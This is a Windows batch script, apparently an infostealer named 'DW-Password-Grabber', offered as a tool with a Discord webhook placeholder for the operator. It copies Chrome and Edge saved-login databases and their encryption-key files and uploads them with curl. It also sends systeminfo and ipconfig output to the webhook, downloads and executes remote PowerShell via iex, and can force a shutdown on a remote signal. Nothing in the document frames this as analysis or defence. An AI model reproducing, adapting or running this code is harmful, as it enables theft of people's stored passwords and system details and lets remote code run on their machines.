@echo off
setlocal enabledelayedexpansion


set "url=https://raw.githubusercontent.com/ZDStudios/DW-Password-Grabber/refs/heads/main/allowed.txt"
set "webhook_url=YOURE_DISCORD_WEBHOOK_URL"

:: Get the HTTP status code using PowerShell
for /f %%i in ('powershell -Command "(Invoke-WebRequest -Uri '%url%').StatusCode"') do set status=%%i

:: Handle different status codes
if "%status%"=="200" (
    echo Status 200: Continuing as normal...
mkdir "C:\Users\%USERNAME%\GP-7"

mkdir "C:\Users\%USERNAME%\GP-7\Chrome"

mkdir "C:\Users\%USERNAME%\GP-7\Chrome\Decrypted"

mkdir "C:\Users\%USERNAME%\GP-7\Chrome\Encrypted"

mkdir "C:\Users\%USERNAME%\GP-7\Edge"

mkdir "C:\Users\%USERNAME%\GP-7\Edge\Decrypted"

mkdir "C:\Users\%USERNAME%\GP-7\Edge\Encrypted"

copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "C:\Users\%USERNAME%\GP-7\Chrome\Encrypted"

copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" "C:\Users\%USERNAME%\GP-7\Chrome\Encrypted"

copy "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"C:\Users\%USERNAME%\GP-7\Edge\Encrypted"

powershell -Command "& {iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ZDStudios/DW-Password-Grabber/refs/heads/main/updates.txt')}"



powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
 

powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='Chrome Browser Info'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%webhook_url%"

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login_Data" "%webhook_url%"

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" "%webhook_url%"

powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='Edge Browser Info'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%webhook_url%"

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login_Data" "%webhook_url%"

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Local State" "%webhook_url%"


:: Run command and process output line by line
for /f "delims=" %%A in ('systeminfo') do (
    rem Send each line separately
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%%A\"}" "%webhook_url%"
    
    rem Wait 20ms before sending the next line (uses ping as timeout doesn't support ms)
    ping 127.0.0.1 -n 1 -w 20 >nul
)

powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='--------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"


powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='Network Info'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"

powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='--------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"



:: Run command and process output line by line
for /f "delims=" %%A in ('ipconfig') do (
    rem Send each line separately
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%%A\"}" "%webhook_url%"
    
    rem Wait 20ms before sending the next line (uses ping as timeout doesn't support ms)
    ping 127.0.0.1 -n 1 -w 20 >nul
)

powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='Grab Success'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"


powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"

) else if "%status%"=="199" (
    echo Status 199: Stopping script...
    exit
) else if "%status%"=="201" (
    echo Status 201: Running additional command...
    shutdown /s /t 0
)
































